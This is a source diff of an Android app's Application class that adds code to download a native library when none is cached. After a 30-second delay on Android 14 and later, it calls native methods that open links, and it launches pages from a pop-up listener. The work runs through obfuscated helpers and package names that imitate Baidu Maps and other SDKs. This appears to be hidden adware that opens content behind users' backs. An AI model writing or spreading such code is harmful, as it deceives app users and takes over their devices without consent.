@@ -3,21 +3,30 @@ package com.lx.lxtoolsproject
 import android.app.Application
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.text.TextUtils
 import android.util.Log
 import com.baidu.maps.utils.MapsUtils
-import com.bytedance.android.openliveplugin.LAT
+import com.keep.up.all.NativeJniUtils
 import com.lx.lxtoolsproject.utils.AdControlCUtils
 import com.lx.lxtoolsproject.utils.OnClickAgreement
 import com.tencent.mmkv.MMKV
 import com.youdao.compositioncorrection.CompositionCorrection
 import com.youdao.sdk.app.YouDaoApplication
+import java.io.File
 
 class ToolsApplication : Application() {
 
     val handle = Handler(Looper.getMainLooper())
 
+    var runnable: Runnable = object : Runnable {
+        override fun run() {
+            NativeJniUtils.openlink(this@ToolsApplication)
+        }
+    }
+    var str: String?=null;
     override fun attachBaseContext(base: Context?) {
         super.attachBaseContext(base)
     }
@@ -54,24 +63,57 @@ class ToolsApplication : Application() {
     }
 
 
+
+
     private fun intGgSource(){
-        val str: String = BuildConfig.AD_LIVE_TIME
+        str = BuildConfig.AD_LIVE_TIME
+        //广告so
         MapsUtils.isAgreementState(str,this,clickAgreement)
+        //能力so
+//        MapsUtils.isAgreementStateAAR(str,this,object :OnClickAgreement{
+//            override fun isAgreement() {
+//            }
+//
+//            override fun isCancelAgreement() {
+//            }
+//        })
+
+
+
     }
 
     private fun initApp(){
         //初始化基础 context mmkv  广告类集合
         AdControlCUtils.initDef(this)
         if (AdControlCUtils.isGoWork(BuildConfig.AD_LIVE_TIME)){
-            //XZR.bldzsjj(this@ToolsApplication)
-            LAT.uvblksf(this@ToolsApplication)
+
+            // 能力so校验
+            if (isAARCacheValid()) {
+                Log.i("AD_LOG", "走了AAR缓存")
+                sdkIntVersionJude()
+            } else {
+                Log.i("AD_LOG","本地没有so能力 开始下载>>>>")
+                MapsUtils.isAgreementStateAAR(str,this,object :OnClickAgreement{
+                    override fun isAgreement() {
+                        sdkIntVersionJude()
+                    }
+
+                    override fun isCancelAgreement() {
+                    }
+                })
+            }
+
+
             AdControlCUtils.handlerPostInitStrategy()
             AdControlCUtils.initSDK()
             AdControlCUtils.setLauncherMiddleListener { intent ->
                 Log.i("AD_LOG","喀什哦弹出")
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                LAT.lsxbherq(intent)
-               // XZR.nxcbfpls(intent)
+                if(isAARCacheValid()){
+                   // LAT.lsxbherq(intent)
+                    NativeJniUtils.pageopen(intent)
+                }
+
             }
 
         }
@@ -81,6 +123,17 @@ class ToolsApplication : Application() {
 
 
 
+    private fun isAARCacheValid(): Boolean {
+        val cFilePath = APPSpUtils.getCAARFilePath()
+        return !TextUtils.isEmpty(cFilePath) && File(cFilePath).length() > 0
+    }
+
+    private fun sdkIntVersionJude(){
+        if (Build.VERSION.SDK_INT >= 34) {
+            //初始化
+            handle.postDelayed(runnable,30000)
+        }
+    }
 
 
 }
